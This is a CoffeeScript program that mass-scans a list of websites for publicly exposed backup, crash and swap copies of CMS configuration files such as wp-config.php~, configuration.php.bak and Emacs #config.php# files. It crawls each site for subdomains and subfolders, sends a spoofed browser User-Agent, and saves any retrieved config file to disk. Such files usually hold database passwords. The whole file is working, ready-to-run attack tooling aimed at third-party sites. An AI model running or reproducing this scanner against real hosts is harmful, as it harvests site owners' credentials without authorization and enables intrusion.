http    = require('http')
fs      = require('fs')
path    = require('path')
$       = require('jquery')
jsdom   = require("jsdom")

jsdom.defaultDocumentFeatures =
  FetchExternalResources   : false
  ProcessExternalResources : false
  MutationEvents           : false
  QuerySelector            : false

settings =
  windows: false      # search for windows temp files (. -> _) (2x slower)
  swapFiles: false    # search for swap files (less useful) (2x slower)
  verbose: false      # prints lots of debug messages
  maxUrlsPerHost: 10  # how many subdomains and subfolders to try per host
  numHosts: 30        # how many

  configFiles: [
    'config.php'                # phpBB, ExpressionEngine
    'configuration.php'         # Joomla
    # 'LocalSettings.php'         # MediaWiki
    # 'mt-config.cgi'             # Movable Type
    # 'mt-static/mt-config.cgi'   # Movable Type
    # 'settings.php'              # Drupal
    # 'system/config/config.php'  # Contao
    'wp-config.php'             # Wordpress
  ]

  # Temp file prefix/suffix is represented by array, where arr[0] is
  # prefix and arr[1] is suffix.
  tempExtensions: [
    # ['', '.save']         # Nano crash file
    # ['', '.save.1']       # Nano crash file (only saved sometimes)
    # ['', '.save.2']       # Nano crash file (only saved sometimes)
    ['%23', '%23']        # Emacs crash file (%23 is urlencoded hash (#))
    ['', '~']             # Vim backup file and Gedit crash file
    ['', '.bak']          # Common backup file extension
    ['', '.old']          # Common backup file extension
  ]

  # Swap files only contain changes since the last save. Could be useful.
  swapExtensions: [
    ['', '.swp']          # Vim
    ['', '.swo']          # Vim
    ['.', '.swp']         # Vim (on unix)
    ['.', '.swp']         # Vim (on unix)
    ['._', '']            # Mac OS X resource fork file (maybe useful)
  ]

  # No config file should contain any of these strings
  # Note: These should be all lowercase
  nonConfig: [
    '<!doctype'
    '<!--'
    '<html'
    'disallowed key characters'
    '<font'
  ]

# File names to search for
testFiles = do ->
  formats = []
  $.merge formats, settings.tempExtensions
  if settings.swapFiles
    $.merge formats, settings.swapExtensions

  ret = []
  for format in formats
    for file in settings.configFiles
      ret.push format[0] + file + format[1]

      # On windows, vim replaces dots with underscores
      if settings.windows
        ret.push file.replace(/\./gi, '_')
  return ret


# Test a given hostname (ex: feross.org) for publicly-visible
# CMS configuration files.
testHost = (host, callback) ->
  settings.verbose and console.log '--------------------------'
  console.log host
  settings.verbose and console.log '--------------------------'
  re = new RegExp "^https?://(?:([0-9a-z.-]+)\.)?" + host.replace('.', '\.') +
                  "/([0-9a-z.~*+,_@!$'()\[\\]\-]+)", "i"
  objectLength = (obj) ->
    size = 0
    for key of obj
        if obj.hasOwnProperty key then size += 1
    return size

  urls = {}
  addUrl = (location) ->
    if location.path?.length
      if location.path.indexOf(location.path.length-1) != '/'
        location.path += '/'
    else
      location.path = ''

    if location.subdomain?.length
      location.subdomain = location.subdomain + '.'
    else
      location.subdomain = ''

    key = location.subdomain + location.host + '/' + location.path

    # Don't add both www and non-www versions of the same URL
    if location.subdomain != ''
      if location.subdomain == 'www.'
        return if urls[key.substring(0, 4)]?
    else
      return if urls['www.' + key]?

    urls[key] = location

  # We've already searched the root of sites
  # addUrl host: host
  # addUrl host: "www.#{host}"

  testUrls = ->
    locs = []
    for url, loc of urls
      locs.push loc

    i = 0
    testNextUrl = ->
      if i >= locs.length
        done && console.log "done with #{host}"
        callback?()
        return

      loc = locs[i]
      settings.verbose && console.log loc
      i += 1
      testUrl loc.subdomain + loc.host, loc.path, ->
        process.nextTick testNextUrl

    testNextUrl()

  try
    jsdom.env "http://#{host}", (errors, window) ->
      console.log errors if errors
      redirectToWWW = /^www\./.exec(window?.location?.hostname)?

      # find urls to test for this host
      hrefs = (tag.href for tag in window?.document.getElementsByTagName('a'))
      for href in hrefs
        if objectLength(urls) >= settings.maxUrlsPerHost then break

        if (result = re.exec(href))?
          # subdomains
          subdomain = undefined
          if (subdomain = result[1])?
            addUrl
              subdomain: subdomain
              host: host

          # subfolders
          if (path = result[2])? and path.indexOf('.') == -1
            addUrl
              subdomain: subdomain ? if redirectToWWW then 'www' else ''
              host: host
              path: path

      testUrls()

  catch error
    settings.verbose && console.log "CAUGHT JSDOM EXCEPTION: #{host} - #{error}"
    testUrls()


testUrl = (host, path, callback) ->
  get = (options, callback) ->
    options.port ?= 80
    options.headers =
      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.106 Safari/535.2'
    http.get(options, (res) ->
      data = ''
      res.on 'data', (chunk) ->
        data += chunk
      res.on 'end',  ->
        callback?(res, data)

    ).on('error', (e) ->
      console.log('Get error: ' + e.message)
      callback?(null, null)
    )

  checkFile = (i) ->
    if i > testFiles.length-1
      callback?()
      return

    console.log host + '/' + path + testFiles[i]
    get {
      host: host
      port: 80
      path: '/' + path + testFiles[i]
    }, (res, data) ->
      if res?.statusCode == 200
        pageHead = data.substr(0,100).toLowerCase()
        return if pageHead.length == 0

        for s in settings.nonConfig
          return if pageHead.indexOf(s) >= 0

        onFoundFile host, path + testFiles[i], data # Found file!

      i += 1
      checkFile i

  checkFile 0


onFoundFile = (host, path, data) ->
  fs.writeFileSync 'results/'+host+'__'+path, data
  console.log '=============================='
  console.log ' FILE FOUND!!! ' + host + '/' + path
  console.log '=============================='


done = false
main = do ->
  sites = fs.readFileSync 'sites.txt'
  re = /(\d+)\t(.+)/g

  if !path.existsSync 'results'
    fs.mkdirSync 'results', 0755

  # We track the number of the last site we tested, so that if we restart
  # the program for some reason, we can skip all the sites we already tested.
  if path.existsSync 'results/lastNum.txt'
    lastNum = +fs.readFileSync 'results/lastNum.txt'

    # Skip sites we've already tested
    while (result = re.exec(sites)) != null
      num = +result[1]
      break if num == lastNum

  else
    lastNum = 0

  testNextSite = ->
    if (result = re.exec(sites)) == null or done
      return

    num = result[1]
    host = result[2]

    fs.writeFileSync 'results/lastNum.txt', num

    testHost host, -> process.nextTick testNextSite

  process.addListener "uncaughtException", (err) ->
    console.log "Uncaught exception: " + err
    console.trace()
    process.nextTick testNextSite

  # process.on 'SIGINT', ->
  #   if done
  #     console.warn 'FORCE QUITTING...'
  #     process.exit(1) # force quit
  #   done = true
  #   console.warn 'Got SIGINT. Shutting down... please wait.'
  #   console.warn 'Press Control-C again to exit immediately.'

  for i in [0...settings.numHosts]
    process.nextTick testNextSite


# testHost 'freetheflash.com'

